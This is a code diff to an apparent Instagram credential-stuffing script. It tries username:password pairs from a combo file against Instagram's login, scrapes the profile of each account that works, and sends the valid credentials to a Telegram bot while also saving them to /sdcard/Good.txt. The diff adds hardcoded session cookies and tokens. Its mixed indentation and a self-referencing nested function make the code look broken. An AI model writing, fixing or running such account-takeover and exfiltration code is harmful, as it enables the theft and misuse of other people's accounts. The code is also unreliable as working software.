@@ -213,7 +213,7 @@ def instagram1():
 	else:
 		pass
 	print(wd+'    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
-	def loopPp():
+	def loopPp(username,name,following,followers,posts,link_url,profile_pic):
 		try:
 			combo=input("    [PATH] File >>> ")
 			file = open(combo,'r').read().splitlines()
@@ -246,11 +246,14 @@ def instagram1():
                         'enc_password': "#PWD_INSTAGRAM_BROWSER:0:"+str(time_now)+":"+str(pasw),
                         'queryParams': {},
                         'optIntoOneTap': 'false',}
-			url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
-			headers_get_info = {
+                import requests, sys, os, random
+                from colorama import Fore
+                url_get_info = 'https://www.instagram.com/accounts/edit/?__a=1'
+                headers_get_info = {
                     'accept': '*/*',
                     'accept-encoding': 'gzip, deflate, br',
                     'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
+                    'cookie': f'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=Zc4tm5D7QNL1hiMGJ1caLT7DNPTYHqH0; ds_user_id=45334757205; sessionid={sessd}; rur=VLL',
                     'referer': 'https://www.instagram.com/accounts/edit/',
                     'sec-fetch-dest': 'empty',
                     'sec-fetch-mode': 'cors',
@@ -260,11 +263,17 @@ def instagram1():
                     'x-ig-www-claim': 'hmac.AR3P8eA45g5ELL3lqdIm-DHKY2MSY_kGWkN0tGEwG2Ks9Ncl',
                     'x-requested-with': 'XMLHttpRequest'
                 }
-			data_get_info = {
+                data_get_info = {
                     '__a': '1'
                 }
-			login = requests.post(url,headers=head,data=data, verify=True).text
-			try:
+                req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
+                email = str(req_get_info.json()['form_data']['email'])
+                first_name = str(req_get_info.json()['form_data']['first_name'])
+                username = str(req_get_info.json()['form_data']['username'])
+                biography = str(req_get_info.json()['form_data']['biography'])
+                external_url = str(req_get_info.json()['form_data']['external_url'])
+                login = requests.post(url,headers=head,data=data, verify=True).text
+                try:
 					if '"authenticated":false' in login:
 						os.system("clear")
 						print(logo2)
@@ -282,21 +291,38 @@ def instagram1():
 						print(logo2)
 						hits+=1
 						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-						req_get_info = requests.get(url_get_info, data=data_get_info, headers=headers_get_info)
-						email = str(req_get_info.json()['form_data']['username'])
-						url = f"https://www.instagram.com/{email}?hl=en"
-						rr = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
-						s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
-						soup = BeautifulSoup(rr,'html.parser')
-						meta = soup.find("meta")
-						name = soup.find("meta", property="og:title")
-						name = name["content"].split("(")[0]
-						link_url = soup.find("meta", property="og:url")
-						description = soup.find("meta", property="og:description")
-						followers = description["content"].split(",")[0]
-						following = description["content"].split(",")[1]
-						posts = description["content"].split(",")[2].split("-")[0]
-						boooom=(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
+                        try:
+                            def script():
+                                try:
+                                	username = username
+                                except:
+                                    print("Something Error!! Retry")
+                                    script()
+                                url = f"https://www.instagram.com/{username}?hl=en"
+                                r = requests.get(url,headers = {'User-agent': 'your bot 0.1'}).text
+                                s = requests.get(url,headers = {'User-agent': 'your bot 0.1'})
+                                soup = BeautifulSoup(r,'html.parser')
+                                meta = soup.find("meta")
+                                name = soup.find("meta", property="og:title")
+                                name = name["content"].split("(")[0]
+                                link_url = soup.find("meta", property="og:url")
+                                profile_pic = soup.find("meta", property="og:image")
+                                description = soup.find("meta", property="og:description")
+                                followers = description["content"].split(",")[0]
+                                following = description["content"].split(",")[1]
+                                posts = description["content"].split(",")[2].split("-")[0]
+                                ouput(username,name,following,followers,posts,link_url,profile_pic)
+                            def ouput(username,name,following,followers,posts,link_url,profile_pic):
+                                print("\nUserName: "+username)
+                                print("\nName: "+name)
+                                print("\nFollowers: "+followers)
+                                print("\nFollowing: "+following)
+                                print("\nPosts: "+posts)
+                                print()
+                            script()
+                        except:
+                            pass
+                        boooom=(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
 						r.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={boooom}\n')
 						with open('/sdcard/Good.txt', 'a') as ff:
 							ff.write(f"Name: "+name+"\nUsername: "+email+"\nGOOD: "+user+":"+pasw+"\nFollowers: "+followers+"\nFollowing: "+following+"\n")
@@ -310,7 +336,7 @@ def instagram1():
 						print(logo2)
 						error+=1
 						print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
-			except:
+				except:
 					print(f' '+W+'['+G+'+'+W+']'+G+' GOOD '+W+':'+G+' '+str(hits)+' \n '+W+'['+R+'-'+W+']'+R+' Checkpoint '+W+':'+R+' '+str(checkpoint)+' \n '+W+'['+wd+'-'+W+']'+wd+' Bad '+W+':'+wd+' '+str(bad)+' \n '+W+'['+Y+'='+W+'] '+Y+'Timeout '+W+': '+str(timeout)+' \n'+W+' ['+B+'-'+W+']'+B+' Error'+W+' :'+B+' '+str(error)+'\n'+wd+'     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n',end='')
 		except FileNotFoundError:
 			print(" [ ! comboka la mobilet a nia ean Path halaya ! ]")
